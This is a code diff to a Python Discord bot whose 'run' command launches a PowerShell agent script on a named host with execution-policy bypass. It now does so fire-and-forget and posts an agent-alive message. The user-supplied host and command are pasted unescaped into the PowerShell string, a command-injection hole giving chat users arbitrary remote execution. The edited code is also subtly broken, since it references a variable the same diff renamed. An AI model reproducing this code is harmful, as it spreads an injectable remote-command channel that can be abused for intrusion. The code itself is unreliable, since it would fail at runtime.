@@ -94,14 +94,15 @@ async def memecheck(interaction: discord.Interaction):
 
 
 @bot.tree.command(name="run", description="Execute PowerShell command")
-async def execute(interaction: discord.Interaction, hostname: str, command: str):
+async def execute(interaction: discord.Interaction, host: str, command: str):
     def run_in_thread():
-        cmd = f'.\\agent2.ps1 -hostname "{hostname}" -command "{command}"'
-        result = subprocess.run(
-            ["powershell.exe", "-NoLogo", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", cmd],
-            capture_output=True, text=True
-        )
-        output = result.stdout if result.stdout else result.stderr
+        cmd = f'.\\agent2.ps1 -hostname "{host}" -command "{command}"'
+
+        amalive = f"```fix\n[ + ] Agent Received Request from {hostname}```"
+        asyncio.run_coroutine_threadsafe(interaction.channel.send(amalive), bot.loop)
+        subprocess.Popen(
+            ["powershell.exe", "-NoLogo", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", cmd])
+
 
     thread = threading.Thread(target=run_in_thread)
     thread.start()
